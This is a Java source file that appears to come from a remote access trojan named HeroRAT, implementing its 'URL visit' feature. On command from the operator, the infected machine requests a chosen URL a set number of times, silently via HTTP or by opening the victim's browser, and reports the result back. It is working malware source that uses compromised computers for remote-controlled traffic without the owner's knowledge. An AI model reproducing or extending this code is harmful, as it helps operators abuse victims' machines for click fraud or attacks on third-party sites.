package net.herorat.features.urlvisit;

import java.awt.Desktop;
import java.io.DataOutputStream;
import java.net.URL;
import java.net.HttpURLConnection;

import net.herorat.network.Packet;
import net.herorat.network.Packet12Urlvisit;


public class UrlVisit
{
	public static void handle(String[] args, DataOutputStream outputstream)
	{
		Packet p;
		if (args.length == 3)
		{
			if (open(args[0], Integer.parseInt(args[1]), args[2].equals("true") ? true : false))
			{
				p = new Packet12Urlvisit(outputstream, new String[] { "SUCCESS" });
				p.write();
			}
			else
			{
				p = new Packet12Urlvisit(outputstream, new String[] { "ERROR" });
			p.write();
			}
		}
		else
		{
			p = new Packet12Urlvisit(outputstream, new String[] { "ERROR" });
			p.write();
		}
	}

	public static boolean open(String url, int times, boolean hidden)
	{
		for (int i=0; i<times; i++)
		{
			try
			{
				if (hidden)
				{
					HttpURLConnection.setFollowRedirects(false);
					HttpURLConnection conn = (HttpURLConnection) (new URL(url)).openConnection();
					conn.setRequestMethod("GET");
					conn.getResponseCode();
					conn.disconnect();
				}
				else
				{
					Desktop.getDesktop().browse((new URL(url)).toURI());
				}
			}
			catch (Exception e)
			{
				return false;
			}
		}
		return true;
	}
}